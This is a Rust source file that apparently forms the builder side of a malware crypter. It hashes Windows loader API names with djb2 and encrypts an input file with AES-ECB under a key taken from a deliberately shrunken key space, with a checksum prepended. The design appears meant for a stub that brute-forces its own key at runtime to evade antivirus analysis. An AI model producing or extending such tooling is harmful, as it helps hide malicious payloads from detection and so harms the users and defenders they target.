use aes::cipher::{BlockEncrypt, KeyInit};
use aes::Aes128;
use rand::Rng;

pub const AES_KEY_SIZE: usize = 16;
pub const AES_BLOCK_SIZE: usize = 16;
pub const CHECKSUM_SIZE: usize = 4;

pub const REQUIRED_APIS: &[&str] = &[
    "LoadLibraryA",
    "GetProcAddress",
    "GetFileSize",
    "CreateFileMappingA",
    "MapViewOfFile",
    "UnmapViewOfFile",
    "CreateFileA",
    "CloseHandle",
    "DeleteFileA",
    "GetModuleHandleA",
    "VirtualAlloc",
    "VirtualProtect",
    "VirtualFree",
    "ExitProcess",
];

pub fn djb2_hash(name: &str) -> u32 {
    let mut hash: u32 = 5381;
    for &b in name.as_bytes() {
        hash = hash.wrapping_mul(33).wrapping_add(b as u32);
    }
    hash
}

pub fn get_checksum(data: &[u8]) -> u32 {
    data.iter().map(|&b| b as u32).sum()
}

pub fn generate_key(length: usize, key_space: u8) -> [u8; AES_KEY_SIZE] {
    let mut rng = rand::thread_rng();
    let mut key = [0u8; AES_KEY_SIZE];
    for i in 0..length {
        key[i] = rng.gen_range(0..key_space);
    }
    key
}

pub fn encrypt_aes_ecb(data: &mut [u8], key: &[u8; AES_KEY_SIZE]) {
    let cipher = Aes128::new_from_slice(key).expect("AES-128 key init failed");
    for block in data.chunks_mut(AES_BLOCK_SIZE) {
        if block.len() == AES_BLOCK_SIZE {
            let mut arr = aes::Block::from_mut_slice(block);
            cipher.encrypt_block(&mut arr);
        }
    }
}

pub fn encrypt_file(
    input: &[u8],
    key_length: usize,
    key_space: u8,
) -> ([u8; AES_KEY_SIZE], Vec<u8>) {
    let key = generate_key(key_length, key_space);

    let padded_size = input.len() + CHECKSUM_SIZE;
    let aligned_size = padded_size + (AES_BLOCK_SIZE - (padded_size % AES_BLOCK_SIZE)) % AES_BLOCK_SIZE;

    let mut buf = vec![0u8; aligned_size];

    let checksum = get_checksum(input);
    buf[..CHECKSUM_SIZE].copy_from_slice(&checksum.to_le_bytes());
    buf[CHECKSUM_SIZE..CHECKSUM_SIZE + input.len()].copy_from_slice(input);

    encrypt_aes_ecb(&mut buf, &key);

    (key, buf)
}
